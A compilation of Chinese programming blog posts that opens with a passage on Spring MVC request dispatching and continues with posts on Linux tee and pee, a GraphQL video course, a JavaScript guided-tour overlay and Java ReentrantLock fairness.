 3      * <p>Tries all handler mappings in order.
 4      * @param request current HTTP request
 5      * @return the HandlerExecutionChain, or {@code null} if no handler could be found
 6      */
 7     protected HandlerExecutionChain getHandler(HttpServletRequest request) throws Exception {
 8 //遍历所有处理器，如下图
 9         for (HandlerMapping hm : this.handlerMappings) {
10             if (logger.isTraceEnabled()) {
11                 logger.trace(
12                         "Testing handler map [" + hm + "] in DispatcherServlet with name '" + getServletName() + "'");
13             }
14             HandlerExecutionChain handler = hm.getHandler(request);
15             if (handler != null) {
16                 return handler;
17             }
18         }
19         return null;
20     }

 
然后，从前往后遍历所有HandlerMapping，直到handler不为空（14-17行）。
对GET请求，确定HandlerMapping为RequestMappingHandlerMapping（继承自AbstractHandlerMapping），其getHandler方法如下：

 1 /**
 2      * Look up a handler for the given request, falling back to the default
 3      * handler if no specific one is found.
 4      * @param request current HTTP request
 5      * @return the corresponding handler instance, or the default handler
 6      * @see #getHandlerInternal
 7      */
 8     @Override
 9     public final HandlerExecutionChain getHandler(HttpServletRequest request) throws Exception {
10 //获取实际处理方法，如public java.util.List<com.service.entity.TaskVO> com.service.controller.TaskController.getTaskListById(java.lang.String)，具体获取方式，见下边 获取HandlerMethod
11         Object handler = getHandlerInternal(request);
12         if (handler == null) {
13             handler = getDefaultHandler();
14         }
15         if (handler == null) {
16             return null;
17         }
18         // Bean name or resolved handler?
19         if (handler instanceof String) {
20             String handlerName = (String) handler;
21             handler = getApplicationContext().getBean(handlerName);
22         }
23 //获取处理器执行链条，包含拦截器等，如下图
24         HandlerExecutionChain executionChain = getHandlerExecutionChain(handler, request);
25         if (CorsUtils.isCorsRequest(request)) {
26             CorsConfiguration globalConfig = this.corsConfigSource.getCorsConfiguration(request);
27             CorsConfiguration handlerConfig = getCorsConfiguration(handler, request);
28             CorsConfiguration config = (globalConfig != null ? globalConfig.combine(handlerConfig) : handlerConfig);
29             executionChain = getCorsHandlerExecutionChain(request, executionChain, config);
30         }
31         return executionChain;
32     }

 
获取HandlerMethod
上边getHandlerInternal方法会调AbstractHandlerMethodMapping类的getHandlerInternal，如下：

 1 /**
 2      * Look up a handler method for the given request.
 3      */
 4     @Override
 5     protected HandlerMethod getHandlerInternal(HttpServletRequest request) throws Exception {
 6 //获取请求路径，如/tasks
 7         String lookupPath = getUrlPathHelper().getLookupPathForRequest(request);
 8         if (logger.isDebugEnabled()) {
 9             logger.debug("Looking up handler method for path " + lookupPath);
10         }
11         this.mappingRegistry.acquireReadLock();
12         try {
13 //①获取请求处理方法HandlerMethod
14             HandlerMethod handlerMethod = lookupHandlerMethod(lookupPath, request);
15             if (logger.isDebugEnabled()) {
16                 if (handlerMethod != null) {
17                     logger.debug("Returning handler method [" + handlerMethod + "]");
18                 }
19                 else {
20                     logger.debug("Did not find handler method for [" + lookupPath + "]");
21                 }
22             }
23 //②根据HandlerMethod解析容器中对应的bean（控制层bean）
24             return (handlerMethod != null ? handlerMethod.createWithResolvedBean() : null);
25         }
26         finally {
27             this.mappingRegistry.releaseReadLock();
28         }
29     }

①获取请求处理方法HandlerMethod
HandlerMethod lookupHandlerMethod(String lookupPath, HttpServletRequest request)方法，根据uri寻找与之匹配的HandlerMethod

 1 /**
 2      * Look up the best-matching handler method for the current request.
 3      * If multiple matches are found, the best match is selected.
 4      * @param lookupPath mapping lookup path within the current servlet mapping
 5      * @param request the current request
 6      * @return the best-matching handler method, or {@code null} if no match
 7      * @see #handleMatch(Object, String, HttpServletRequest)
 8      * @see #handleNoMatch(Set, String, HttpServletRequest)
 9      */
10     protected HandlerMethod lookupHandlerMethod(String lookupPath, HttpServletRequest request) throws Exception {
11         List<Match> matches = new ArrayList<Match>();
12 //lookupPath=/tasks，获取与请求uri匹配的接口信息，如 [{[/tasks],methods=[POST],produces=[application/json;charset=UTF-8]}, {[/tasks],methods=[GET],produces=[application/json;charset=UTF-8]}]，其中MappingRegistry mappingRegistry包含了系统所有uri和接口信息。
13         List<T> directPathMatches = this.mappingRegistry.getMappingsByUrl(lookupPath);
14 //遍历得到的uri，根据请求信息，如GET方法等，选择匹配的uri（{[/tasks],methods=[GET],produces=[application/json;charset=UTF-8]}），在mappingRegistry中获取匹配的HandlerMethod，包含后台接口详细信息，如下图。
15         if (directPathMatches != null) {
16             addMatchingMappings(directPathMatches, matches, request);
17         }
18         if (matches.isEmpty()) {
19             // No choice but to go through all mappings...
20             addMatchingMappings(this.mappingRegistry.getMappings().keySet(), matches, request);
21         }
22 
23         if (!matches.isEmpty()) {
24 //对所有匹配的接口进行排序，并使用第一个（排序规则后续再研究）
25             Comparator<Match> comparator = new MatchComparator(getMappingComparator(request));
26             Collections.sort(matches, comparator);
27             if (logger.isTraceEnabled()) {
28                 logger.trace("Found " + matches.size() + " matching mapping(s) for [" +
29                         lookupPath + "] : " + matches);
30             }
31             Match bestMatch = matches.get(0);
32             if (matches.size() > 1) {
33                 if (CorsUtils.isPreFlightRequest(request)) {
34                     return PREFLIGHT_AMBIGUOUS_MATCH;
35                 }
36                 Match secondBestMatch = matches.get(1);
37                 if (comparator.compare(bestMatch, secondBestMatch) == 0) {
38                     Method m1 = bestMatch.handlerMethod.getMethod();
39                     Method m2 = secondBestMatch.handlerMethod.getMethod();
40                     throw new IllegalStateException("Ambiguous handler methods mapped for HTTP path '" +
41                             request.getRequestURL() + "': {" + m1 + ", " + m2 + "}");
42                 }
43             }
44             handleMatch(bestMatch.mapping, lookupPath, request);
45             return bestMatch.handlerMethod;
46         }
47         else {
48             return handleNoMatch(this.mappingRegistry.getMappings().keySet(), lookupPath, request);
49         }
50     }


其中，第13行为根据lookupPath（/tasks）获取接口信息，第16行根据接口信息获取后台接口和bean等信息，所有这些信息都存储在内部类MappingRegistry对象中。并且中间会构建一个Match对象，包含所有匹配的接口，并选择第一个作为实际处理接口。MappingRegistry内部类如下所示：

 1 /**
 2      * A registry that maintains all mappings to handler methods, exposing methods
 3      * to perform lookups and providing concurrent access.
 4      *
 5      * <p>Package-private for testing purposes.
 6      */
 7     class MappingRegistry {
 8 //控制层uri接口信息注册
 9         private final Map<T, MappingRegistration<T>> registry = new HashMap<T, MappingRegistration<T>>();
10 //存储uri接口信息和HandlerMethod，如{{[/tasks],methods=[POST],produces=[application/json;charset=UTF-8]}=public com.service.entity.TaskVO com.service.controller.TaskController.addTask(java.lang.String) throws com.service.exception.BizException, {[/tasks],methods=[GET],produces=[application/json;charset=UTF-8]}=public java.util.List<com.service.entity.TaskVO> com.service.controller.TaskController.getTaskListById(java.lang.String)}
11         private final Map<T, HandlerMethod> mappingLookup = new LinkedHashMap<T, HandlerMethod>();
12 //存储uri和uri接口信息（一对多关系），如：{/tasks=[{[/tasks],methods=[POST],produces=[application/json;charset=UTF-8]}, {[/tasks],methods=[GET],produces=[application/json;charset=UTF-8]}]}        private final MultiValueMap<String, T> urlLookup = new LinkedMultiValueMap<String, T>();
13 
14         private final Map<String, List<HandlerMethod>> nameLookup =
15                 new ConcurrentHashMap<String, List<HandlerMethod>>();
16 
17         private final Map<HandlerMethod, CorsConfiguration> corsLookup =
18                 new ConcurrentHashMap<HandlerMethod, CorsConfiguration>();
19 
20         private final ReentrantReadWriteLock readWriteLock = new ReentrantReadWriteLock();
21 
22         /**
23          * Return all mappings and handler methods. Not thread-safe.
24          * @see #acquireReadLock()
25          */
26         public Map<T, HandlerMethod> getMappings() {
27             return this.mappingLookup;
28         }
29 
30         /**
31          * Return matches for the given URL path. Not thread-safe.
32          * @see #acquireReadLock()
33          */
34         public List<T> getMappingsByUrl(String urlPath) {
35             return this.urlLookup.get(urlPath);
36         }
37 ...........
38 }

②根据HandlerMethod解析容器中对应的bean（控制层bean）
根据上一步得到HandlerMethod，其中bean为bean的名字，将其替换成容器中的bean（控制层对应的bean），调HandlerMethod的createWithResolvedBean方法，如下：

 1 /**
 2      * If the provided instance contains a bean name rather than an object instance,
 3      * the bean name is resolved before a {@link HandlerMethod} is created and returned.
 4      */
 5     public HandlerMethod createWithResolvedBean() {
 6         Object handler = this.bean;
 7         if (this.bean instanceof String) {
 8             String beanName = (String) this.bean;
 9             handler = this.beanFactory.getBean(beanName);
10         }
11         return new HandlerMethod(this, handler);
12     }

其中handler为控制层对应的bean，如下图：

最后，重新构建HandlerMethod，用真实的bean替换掉原来的bean名。

另外，上边涉及的HandlerMapping的类结构如下：

2、确定适配器
存在3种适配器，存储在handlerAdapters中，如下图。

DispatcherServlet方法getHandlerAdapter，根据上一步获取到的处理器HandlerMethod，确定匹配的适配器，代码如下：

/**
     * Return the HandlerAdapter for this handler object.
     * @param handler the handler object to find an adapter for 
     * @throws ServletException if no HandlerAdapter can be found for the handler. This is a fatal error.
     */
    protected HandlerAdapter getHandlerAdapter(Object handler) throws ServletException {
//遍历所有适配器，如下图。其中handler值为public java.util.List<com.service.entity.TaskVO> com.service.controller.TaskController.getTaskListById(java.lang.String) ，判断适配器是否支持该接口，在本例中RequestMappingHandlerAdapter支持
        for (HandlerAdapter ha : this.handlerAdapters) {
            if (logger.isTraceEnabled()) {
                logger.trace("Testing handler adapter [" + ha + "]");
            }
//判断是否支持，代码见下边
            if (ha.supports(handler)) {
                return ha;
            }
        }
        throw new ServletException("No adapter for handler [" + handler +
                "]: The DispatcherServlet configuration needs to include a HandlerAdapter that supports this handler");
    }

 在GET请求中，由于使用注解@RequestMapping，获取到适配器为：org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter（继承自AbstractHandlerMethodAdapter），support方法如下：

AbstractHandlerMethodAdapter1 /**
2      * This implementation expects the handler to be an {@link HandlerMethod}.
3      * @param handler the handler instance to check
4      * @return whether or not this adapter can adapt the given handler
5      */
6     @Override
7     public final boolean supports(Object handler) {
8         return (handler instanceof HandlerMethod && supportsInternal((HandlerMethod) handler));
9     }

 RequestMappingHandlerAdapter的supportsInternal方法总返回true，因为接口方法参数和返回值可能存在其他的处理，参数可由HandlerMethodArgumentResolver处理（见后续文章），返回值可由HandlerMethodReturnValueHandler处理（见上篇）

/**
     * Always return {@code true} since any method argument and return value
     * type will be processed in some way. A method argument not recognized
     * by any HandlerMethodArgumentResolver is interpreted as a request parameter
     * if it is a simple type, or as a model attribute otherwise. A return value
     * not recognized by any HandlerMethodReturnValueHandler will be interpreted
     * as a model attribute.
     */
    @Override
    protected boolean supportsInternal(HandlerMethod handlerMethod) {
        return true;
    }

 最终适配器返回结果如下：

3、请求实际处理，包括请求参数的处理、后台接口的调用和返回数据的处理
调RequestMappingHandlerAdapter的handle方法，对请求进行处理，会调ServletInvocableHandlerMethod的invokeAndHandle方法，其控制整个请求和响应返回的过程。

 1 /**
 2      * Invokes the method and handles the return value through one of the
 3      * configured {@link HandlerMethodReturnValueHandler}s.
 4      * @param webRequest the current request
 5      * @param mavContainer the ModelAndViewContainer for this request
 6      * @param providedArgs "given" arguments matched by type (not resolved)
 7      */
 8     public void invokeAndHandle(ServletWebRequest webRequest,
 9             ModelAndViewContainer mavContainer, Object... providedArgs) throws Exception {
10 //①请求对应的方法，底层采用反射的方式(通过HandleMethod获取控制层的方法和bean，实现反射。第一步已获取到HandleMethod)
11         Object returnValue = invokeForRequest(webRequest, mavContainer, providedArgs);
12         setResponseStatus(webRequest);
13 
14         if (returnValue == null) {
15             if (isRequestNotModified(webRequest) || hasResponseStatus() || mavContainer.isRequestHandled()) {
16                 mavContainer.setRequestHandled(true);
17                 return;
18             }
19         }
20         else if (StringUtils.hasText(this.responseReason)) {
21             mavContainer.setRequestHandled(true);
22             return;
23         }
24 
25         mavContainer.setRequestHandled(false);
26         try {
27 //②对方法返回的数据，进行处理，包括切面处理和数据转换（如json）
28             this.returnValueHandlers.handleReturnValue(
29                     returnValue, getReturnValueType(returnValue), mavContainer, webRequest);
30         }
31         catch (Exception ex) {
32             if (logger.isTraceEnabled()) {
33                 logger.trace(getReturnValueHandlingErrorMessage("Error handling return value", returnValue), ex);
34             }
35             throw ex;
36         }
37     }

①请求对应的方法，底层采用反射的方式
解析请求参数，调后台接口，返回结果数据，代码如下：

 1 /**
 2      * Invoke the method after resolving its argument values in the context of the given request.
 3      * <p>Argument values are commonly resolved through {@link HandlerMethodArgumentResolver}s.
 4      * The {@code providedArgs} parameter however may supply argument values to be used directly,
 5      * i.e. without argument resolution. Examples of provided argument values include a
 6      * {@link WebDataBinder}, a {@link SessionStatus}, or a thrown exception instance.
 7      * Provided argument values are checked before argument resolvers.
 8      * @param request the current request
 9      * @param mavContainer the ModelAndViewContainer for this request
10      * @param providedArgs "given" arguments matched by type, not resolved
11      * @return the raw value returned by the invoked method
12      * @exception Exception raised if no suitable argument resolver can be found,
13      * or if the method raised an exception
14      */
15     public Object invokeForRequest(NativeWebRequest request, ModelAndViewContainer mavContainer,
16             Object... providedArgs) throws Exception {
17 //获取并处理请求参数
18         Object[] args = getMethodArgumentValues(request, mavContainer, providedArgs);
19         if (logger.isTraceEnabled()) {
20             StringBuilder sb = new StringBuilder("Invoking [");
21             sb.append(getBeanType().getSimpleName()).append(".");
22             sb.append(getMethod().getName()).append("] method with arguments ");
23             sb.append(Arrays.asList(args));
24             logger.trace(sb.toString());
25         }
26 //反射调用HandlerMethod中bean对应的接口
27         Object returnValue = doInvoke(args);
28         if (logger.isTraceEnabled()) {
29             logger.trace("Method [" + getMethod().getName() + "] returned [" + returnValue + "]");
30         }
31         return returnValue;
32     }

②对方法返回的数据，进行处理，包括切面处理和数据转换
参见上篇文章SpringCloud请求响应数据转换（一）
请求过程涉及的类

 
********************************************************************************************************************************************************************************************************
Linux tee的花式用法和pee
1.tee多重定向
tee [options] FILE1 FILE2 FILE3...
tee的作用是将一份标准输入多重定向，一份重定向到标准输出/dev/stdout，然后还将标准输入重定向到每个文件FILE中。
例如：
$ cat alpha.log | tee file1 file2 file3 | cat
$ cat alpha.log | tee file1 file2 file3 >/dev/null
上面第一个命令将alpha.log的文件内容重定向给file{1..3}和标准输出通过管道传递给cat；
上面第二个命令将alpha.log的文件内容重定向给file{1..3}和/dev/null。
tee重定向给多个命令
写多了脚本的人可能遇到过这样一种需求：将一份标准输入，重定向到多个命令中去。大概是这样的：
                      | CMD1
                    ↗
        INPUT | tee 
                    ↘
                      | CMD2
其实bash自身的特性就能实现这样的需求，通过重定向到子shell中，就能模拟一个文件重定向行为：
cat alpha.txt | tee >(grep -E "a|b") >(grep -E "d|b|c")
上面的命令将alpha.txt文件内容重定向为3份：一份给第一个grep命令，一份给第二个grep命令，一份给标准输出。假如alpha.txt的内容是a b c d e5个字母分别占用5行(每行一个字母)，上面的输出结果如下：
a
b
c
d
e  # 前5行是重定向到/dev/stdout的
a
b  # 这2行是重定向给第一个grep后的执行结果
b
c
d  # 这3行是重定向给第二个grep后的执行结果
如果不想要给标准输出的那份重定向，加上>/dev/null：
cat alpha.txt | tee >(grep -E "a|b") >(grep -E "d|b|c") >/dev/null
tee重定向给多个命令时的问题
但是必须注意，tee将数据重定向给不同命令时，这些命令是独立执行的，它们都会各自打开一个属于自己的STDOUT，如果它们都重定向到标准输出，由于涉及到多个不同的/dev/stdout，它们的结果将出现两个问题：

不保证有序性

因为跨了命令，交互式模式下(默认标准输出为屏幕)可能会出现命令行隔断的问题(非交互式下不会有问题)

例如：
$ cat alpha.txt | tee >(grep -E "a|b") >(grep -E "d|b|c") >/dev/null
$ a     # 结果直接出现在提示符所在行
b
b
c
d

$ cat alpha.txt | tee >(grep -E "a|b") >(grep -E "d|b|c") >/dev/null
b
c      # 这次的结果和上次的顺序不一样
d
a
b
这两个问题，在写脚本过程中必须解决。
对于第二个问题：不同/dev/stdout同时输出时在屏幕上交叉输出的问题，只需将它们再次重定向走即可，这样两份不同的/dev/stdout都再次同时作为一份标准输入：
$ cat alpha.txt | tee >(grep -E "a|b") >(grep -E "d|b|c") >/dev/null | cat
对于第一个问题：不同/dev/stdout同时输出时，输出顺序的随机性，这个没有好方法，只能在各命令行中将各自的结果保存到文件中：
$ cat alpha.txt | tee >(grep -E "a|b" >file1) >(grep -E "d|b|c" >file2) >/dev/null
所以，tee在重定向到多个命令中是有缺陷的，或者说用起来非常不方便，只要将各命令的结果各自保存时，才能一切按照自己的预期进行。那么，pee登场了，多重定向非常好用的一个命令。
2.pee代替tee
pee是moreutils包中的一个小工具，先安装它(epel源中有)：
yum -y install moreutils
在man pee中，pee的作用是将标准输入tee给管道。语法：
pee ["cmds"]
不是很好理解，可以通过几个示例直接感受它的用法。
$ cat alpha.txt | pee 'grep -E "a|b"' 'grep -E "d|b|c"'
a
b
b
c
d
所以，它的基本用法是pee "CMD1" "CMD2"。
如果想将结果保存到文件，只需加一个命令即可，例如下面的cat >myfile。
$ cat alpha.txt | pee 'grep -E "a|b"' 'grep -E "d|b|c"' 'cat >myfile'
和tee有同样的问题，如果各命令都没有指定自己的标准输出重定向，它们将各自打开一个属于自己的/dev/stdout，同样会有多个/dev/stdout同时输出时结果数据顺序随机性的问题，但是不会有多个/dev/stdout同时输出时交互式的隔断性问题，因为pee会收集各个命令的标准输出，然后将收集的结果作为自己的标准输出。
pee和tee最大的不同，在于pee将来自多个不同命令的结果作为pee自己的标准输出，所以下面的命令是可以像普通命令一样进行重定向的。
INPUT | pee CMD1 CMD2 >/FILE
而tee则不同，是将cmd1和cmd2的结果放进标准输出(假设各命令自身没有使用重定向)，保存到FILE中的是tee读取的标准输入。
INPUT | tee >(cmd1) >(cmd2) >/FILE
所以，想要重定向tee中cmd1和cmd2的总结果，必须使用额外的管道，或者将整个tee放进子shell。
INPUT | tee >(cmd1) >(cmd2) >/dev/null | cat >FILE1
INPUT | ( tee >(cmd1) >(cmd2) >/dev/null ) >/FILE1

********************************************************************************************************************************************************************************************************
【视频】使用ASP.NET Core开发GraphQL服务
GraphQL 既是一种用于 API 的查询语言也是一个满足你数据查询的运行时。 
GraphQL来自Facebook，它于2012年开始开发，2015年开源。 
GraphQL与编程语言无关，可以使用很多种语言/框架来构建Graph 服务器，包括.NET Core。
像Github，Pinterest，Coursera等公司都在使用GraphQL。Github的API到目前有4个版本，第三个版本用的是REST，而第四个版本使用的是GraphQL。
 
下面是GraphQL的典型应用场景：
 

 
视频教程：使用ASP.NET Core 开发GraphQL服务
该视频一共有8集，全部录制完成并已上传，但是估计B站还没有审核完毕。
视频地址：

哔哩哔哩：https://www.bilibili.com/video/av33252179/
腾讯视频：http://v.qq.com/vplus/4cfb00af75c16eb8d198c58fb86eb4dc/foldervideos/ead0015018e4ud9

 
第一集：

 
********************************************************************************************************************************************************************************************************
手把手教你实现一个引导动画
前言
最近看了一些文章，知道了实现引导动画的基本原理，所以决定来自己亲手做一个通用的引导动画类。
我们先来看一下具体的效果：点这里
原理

通过维护一个Modal实例，使用Modal的mask来隐藏掉页面的其他元素。
根据用户传入的需要引导的元素列表，依次来展示元素。展示元素的原理：通过cloneNode来复制一个当前要展示元素的副本，通过当前元素的位置信息来展示副本，并且通过z-index属性来让其在ModalMask上方展示。大致代码如下：
const newEle = target.cloneNode(true);
const rect = target.getBoundingClientRect();
newEle.style.zIndex = '1001';
newEle.style.position = 'fixed';
newEle.style.width = `${rect.width}px`;
newEle.style.height = `${rect.height}px`;
newEle.style.left = `${rect.left}px`;
newEle.style.top = `${rect.top}px`;
this.modal.appendChild(newEle);
当用户点击了当前展示的元素时，则展示下一个元素。

原理听起来是不是很简单？但是其实真正实现起来，还是有坑的。比如说，当需要展示的元素不在页面的可视范围内如何处理。
当要展示的元素不在页面可视范围内，主要分为三种情况：

展示的元素在页面可视范围的上边。
展示的元素在页面可视范围的下边。
展示的元素在可视范围内，可是展示不全。

由于我是通过getBoundingClientRect这个api来获取元素的位置、大小信息的。这个api获取的位置信息是相对于视口左上角位置的（如下图）。

对于第一种情况，这个api获取的top值为负值，这个就比较好处理，直接调用window.scrollBy(0, rect.top)来将页面滚动到展示元素的顶部即可。
而对于第二、三种情况，我们可以看下图

从图片我们可以看出来，当rect.top+rect.height < window.innerHeight的时候，说明展示的元素不在视野范围内，或者展示不全。对于这种情况，我们也可以通过调用window.scrollBy(0, rect.top)的方式来让展示元素尽可能在顶部。
对上述情况的调节代码如下：
// 若引导的元素不在页面范围内，则滚动页面到引导元素的视野范围内
adapteView(ele) {
    const rect = ele.getBoundingClientRect();
    const height = window.innerHeight;
    if (rect.top < 0 || rect.top + rect.height > height) {
        window.scrollBy(0, rect.top);
    }
}
接下来，我们就来一起实现下这个引导动画类。
第一步：实现Modal功能
我们先不管具体的展示逻辑实现，我们先实现一个简单的Modal功能。
class Guidences {
  constructor() {
    this.modal = null;
    this.eleList = [];
  }
  // 入口函数
  showGuidences(eleList = []) {
    // 允许传入单个元素
    this.eleList = eleList instanceof Array ? eleList : [eleList];
    // 若之前已经创建一个Modal实例，则不重复创建
    this.modal || this.createModel();
  }
  // 创建一个Modal实例
  createModel() {
    const modalContainer = document.createElement('div');
    const modalMask = document.createElement('div');
    this.setMaskStyle(modalMask);
    modalContainer.style.display = 'none';
    modalContainer.appendChild(modalMask);
    document.body.appendChild(modalContainer);
    this.modal = modalContainer;
  }

  setMaskStyle(ele) {
    ele.style.zIndex = '1000';
    ele.style.background = 'rgba(0, 0, 0, 0.8)';
    ele.style.position = 'fixed';
    ele.style.top = 0;
    ele.style.right = 0;
    ele.style.bottom = 0;
    ele.style.left = 0;
  }
 
  hideModal() {
    this.modal.style.display = 'none';
    this.modal.removeChild(this.modalBody);
    this.modalBody = null;
  }

  showModal() {
    this.modal.style.display = 'block';
  }
}
第二步：实现展示引导元素的功能
复制一个要展示元素的副本，根据要展示元素的位置信息来放置该副本，并且将副本当成Modal的主体内容展示。
class Guidences {
  constructor() {
    this.modal = null;
    this.eleList = [];
  }
  // 允许传入单个元素
  showGuidences(eleList = []) {
    this.eleList = eleList instanceof Array ? eleList : [eleList];
    this.modal || this.createModel();
    this.showGuidence();
  }
  // 展示引导页面
  showGuidence() {
    if (!this.eleList.length) {
      return this.hideModal();
    }
    // 移除上一次的展示元素
    this.modalBody && this.modal.removeChild(this.modalBody);
    const ele = this.eleList.shift(); // 当前要展示的元素
    const newEle = ele.cloneNode(true); // 复制副本
    this.modalBody = newEle;
    this.initModalBody(ele);
    this.showModal();
  }

  createModel() {
    // ...
  }

  setMaskStyle(ele) {
    // ...
  }

  initModalBody(target) {
    this.adapteView(target);
    const rect = target.getBoundingClientRect();
    this.modalBody.style.zIndex = '1001';
    this.modalBody.style.position = 'fixed';
    this.modalBody.style.width = `${rect.width}px`;
    this.modalBody.style.height = `${rect.height}px`;
    this.modalBody.style.left = `${rect.left}px`;
    this.modalBody.style.top = `${rect.top}px`;
    this.modal.appendChild(this.modalBody);
    // 当用户点击引导元素，则展示下一个要引导的元素
    this.modalBody.addEventListener('click', () => {
      this.showGuidence(this.eleList);
    });
  }
  // 若引导的元素不在页面范围内，则滚动页面到引导元素的视野范围内
  adapteView(ele) {
    const rect = ele.getBoundingClientRect();
    const height = window.innerHeight;
    if (rect.top < 0 || rect.top + rect.height > height) {
      window.scrollBy(0, rect.top);
    }
  }

  hideModal() {
      // ...
  }

  showModal() {
      // ...
  }
}

完整的代码可以在点击这里
调用方式
const guidences = new Guidences();
function showGuidences() {
    const eles = Array.from(document.querySelectorAll('.demo'));
    guidences.showGuidences(eles);
}
showGuidences();
总结
除了使用cloneNode的形式来实现引导动画外，还可以使用box-shadow、canvas等方式来做。详情可以看下这位老哥的文章新手引导动画的4种实现方式。
本文地址在->本人博客地址, 欢迎给个 start 或 follow

********************************************************************************************************************************************************************************************************
Java并发编程(3) JUC中的锁
 一 前言
　　前面已经说到JUC中的锁主要是基于AQS实现，而AQS（AQS的内部结构 、AQS的设计与实现）在前面已经简单介绍过了。今天记录下JUC包下的锁是怎么基于AQS上实现的

二 同步锁
　　同步锁不是JUC中的锁但也顺便提下，它是由synchronized 关键字进行同步，实现对竞争资源互斥访问的锁。
　　同步锁的原理：对于每一个对象，有且仅有一个同步锁；不同的线程能共同访问该同步锁。在同一个时间点该同步锁能且只能被一个线程获取到，其他线程都得等待。
　　另外：synchronized是Java中的关键字且是内置的语言实现；它是在JVM层面上实现的，不但可以通过一些监控工具监控synchronized的锁定，而且在代码执行时出现异常，JVM会自动释放锁定；synchronized等待的线程会一直等待下去，不能响应中断。
三 JUC中的锁结构
　　相比同步锁，JUC包中的锁的功能更加强大，它为锁提供了一个框架，该框架允许更灵活地使用锁（它由自己实现、需要手动释放锁、能响应中断、可以多线程跑提高效率等）。下图是根据源码中查出画的类图，便知它提供的锁有好几种，下面一一分析。
四 可重入锁-ReentrantLock
　　重入锁ReentrantLock，顾名思义：就是支持重进入的锁，它表示该锁能够支持一个线程对资源的重复加锁。另外该锁孩纸获取锁时的公平和非公平性选择，所以它包含公平锁与非公平锁（它们两也可以叫可重入锁）。首先提出两个疑问：它怎么实现重进入呢？释放逻辑还跟AQS中一样吗？
非公平锁

    final boolean nonfairTryAcquire(int acquires) {
        final Thread current = Thread.currentThread();
        int c = getState();
        if (c == 0) {
            if (compareAndSetState(0, acquires)) {
                setExclusiveOwnerThread(current);
                return true;
            }
        }
        // 同步状态已经被其他线程占用，则判断当前线程是否与被占用的线程是同一个线程，如果是同一个线程则允许获取，并state+1
        else if (current == getExclusiveOwnerThread()) {
            int nextc = c + acquires;
            if (nextc < 0) // overflow
                throw new Error("Maximum lock count exceeded");
            setState(nextc);
            return true;
        }
        return false;
    }

　　该方法增加了再次获取同步状态的处理逻辑：通过判断当前线程是否为获取锁的线程来决定获取操作是否成功。如果是获取锁的线程再次请求，则将同步状态值进行增加并返回true,表示获取同步状态成功。

protected final boolean tryRelease(int releases) {
    int c = getState() - releases;
    if (Thread.currentThread() != getExclusiveOwnerThread())
        throw new IllegalMonitorStateException();
    boolean free = false;
    if (c == 0) {
        free = true;
        setExclusiveOwnerThread(null);
    }
    setState(c);
    return free;
}

　　上面代码是释放锁的代码。如果该锁被获取了n次，那么前（n-1）次都是返回false,直至state=0，将占有线程设置为null，并返回true,表示释放成功。
公平锁
　　公平锁与非公平锁有啥区别呢？ 还是从源码中分析吧。

protected final boolean tryAcquire(int acquires) {
    final Thread current = Thread.currentThread();
    int c = getState();
    if (c == 0) {
        // 区别：增加判断同步队列中当前节点是否有前驱节点的判断
        if (!hasQueuedPredecessors() &&
                compareAndSetState(0, acquires)) {
            setExclusiveOwnerThread(current);
            return true;
        }
    }
    // 一样支持重入
    else if (current == getExclusiveOwnerThread()) {
        int nextc = c + acquires;
        if (nextc < 0)
            throw new Error("Maximum lock count exceeded");
        setState(nextc);
        return true;
    }
    return false;
}

　　与非公平锁的唯一不同就是增加了一个判断条件：判断同步队列中当前节点是否有前驱节点的判断，如果方法返回true,则表示有线程比当前线程更早地请求获取锁，因此需要等待前驱线程获取并释放锁之后才能继续获取锁。
公平锁与非公平锁的区别
　　从上面源码中得知，公平性锁保证了锁的获取按照FIFO原则，但是代价就是进行大量的线程切换。而非公平性锁，可能会造成线程“饥饿”（不会保证先进来的就会先获取），但是极少线程的切换，保证了更大的吞吐量。下面我们看下案例：

import org.junit.Test;

import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;

public class FairAndUnfairTest {
    private static Lock fairLock = new ReentrantLock2(true);
    private static Lock unFairLock = new ReentrantLock2(false);

    @Test
    public void fair() throws Exception{
        testLock(fairLock);
    }

    @Test
    public void unFairLock() throws Exception{
        testLock(unFairLock);
    }

    private static void testLock(Lock lock) throws InterruptedException, ExecutionException {
        ExecutorService threadPool = Executors.newFixedThreadPool(5);
        List<Future<Long>> list = new ArrayList<>();
        for (int i = 0 ; i < 5; i++) {
            Future<Long> future = threadPool.submit(new Job(lock));
            list.add(future);
        }
        long cost = 0;
        for (Future<Long> future : list) {
            cost += future.get();
        }
        // 查看五个线程所需耗时的时间
        System.out.println("cost:" + cost + " ms");
    }

    private static class Job implements Callable<Long> {
        private Lock lock;
        public Job(Lock lock) {
            this.lock = lock;
        }
        @Override
        public Long call() throws Exception {
            long st = System.currentTimeMillis();
            // 同一线程获取100锁
            for (int i =0; i < 100; i ++) {
                lock.lock();
                try {
                    System.out.println("Lock by[" + Thread.currentThread().getId() + "]," +
                            "Waiting by[" + printThread(((ReentrantLock2)lock).getQueuedThreads()) + "]");
                } catch (Exception e) {
                    e.printStackTrace();
                } finally {
                    lock.unlock();
                }
            }
            // 返回100次所需的时间
            return System.currentTimeMillis() - st;
        }

        private String printThread(Collection<Thread> list) {
            StringBuilder ids = new StringBuilder();
            for (Thread t : list) {
                ids.append(t.getId()).append(",");
            }
            return ids.toString();
        }
    }

    private static class ReentrantLock2 extends ReentrantLock {
        public ReentrantLock2(boolean fair) {
            super(fair);
        }

        public Collection<Thread> getQueuedThreads() {
            List<Thread> arrayList = new ArrayList<>(super.getQueuedThreads());
            Collections.reverse(arrayList);
            return arrayList;
        }
    }
}

　　非公平性锁的测试结果，cost:117 ms


Lock by[9],Waiting by[]
Lock by[9],Waiting by[]
Lock by[9],Waiting by[]
Lock by[9],Waiting by[]
Lock by[9],Waiting by[]
Lock by[9],Waiting by[]
Lock by[9],Waiting by[]
Lock by[9],Waiting by[]
Lock by[9],Waiting by[]
Lock by[9],Waiting by[]
Lock by[9],Waiting by[]
Lock by[9],Waiting by[]
Lock by[9],Waiting by[]
Lock by[9],Waiting by[]
Lock by[9],Waiting by[]
Lock by[9],Waiting by[]
Lock by[9],Waiting by[]
Lock by[9],Waiting by[]
Lock by[9],Waiting by[]
Lock by[9],Waiting by[]
Lock by[9],Waiting by[]
Lock by[9],Waiting by[]
Lock by[9],Waiting by[]
Lock by[9],Waiting by[]
Lock by[9],Waiting by[]
Lock by[9],Waiting by[]
Lock by[9],Waiting by[]
Lock by[9],Waiting by[]
Lock by[9],Waiting by[]
Lock by[10],Waiting by[]
Lock by[10],Waiting by[9,]
